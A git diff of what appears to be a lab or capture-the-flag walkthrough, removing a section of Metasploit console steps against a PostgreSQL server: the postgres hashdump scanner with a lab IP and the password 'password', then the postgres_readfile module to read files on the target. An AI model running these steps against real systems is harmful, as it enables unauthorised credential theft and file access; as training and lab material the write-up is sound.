@@ -254,45 +254,7 @@ The module successfully read files from the target machine using the authenticat
 <img width="1291" height="630" alt="image" src="https://github.com/user-attachments/assets/d60f641e-1792-4adf-9788-9ec59c75e1c2" />
 
 ---
-
-Now the next step is dumping user hashes
-back again 
-> back
-search for auxilary that help us to dump hash
-> search auxiliary scanner postgre hashdump
-
-<img width="1194" height="264" alt="image" src="https://github.com/user-attachments/assets/e87ea55a-58cd-4487-bb29-067cf0cbd048" />
-
-Let use it and config
-> use 0
-> show options
-> set RHOST 10.49.190.166
-> set password password
-
-<img width="1429" height="683" alt="image" src="https://github.com/user-attachments/assets/399ee9d4-124d-41be-8668-9791f3d064a5" />
-
-> run
-
-<img width="644" height="387" alt="image" src="https://github.com/user-attachments/assets/d99b6e3c-15c5-484c-867b-675b7e98d5e2" />
-
-
-Ok now the next step is we need to use a module that allows an authenticated user to view files of their choosing on the server for that we r going to use readfile auxilary
-
-> back
-> search auxiliary postgresql
-> use auxiliary/admin/postgres/postgres_readfile or use 5
-+
-<img width="1744" height="480" alt="image" src="https://github.com/user-attachments/assets/9817035a-d7a5-47e3-bcfa-c91586525e93" />
-
-> show option
-
-<img width="1456" height="781" alt="image" src="https://github.com/user-attachments/assets/3a807664-cb93-46f5-a799-817ccaf559d6" />
-
-> run
-
-<img width="1097" height="748" alt="image" src="https://github.com/user-attachments/assets/67192a58-b5e5-49e1-9ef4-f5d8128f737b" />
-
-<img width="1291" height="630" alt="image" src="https://github.com/user-attachments/assets/d60f641e-1792-4adf-9788-9ec59c75e1c2" />
+---
 
 now we need to run module that allows arbitrary command execution with the proper user credentials
 
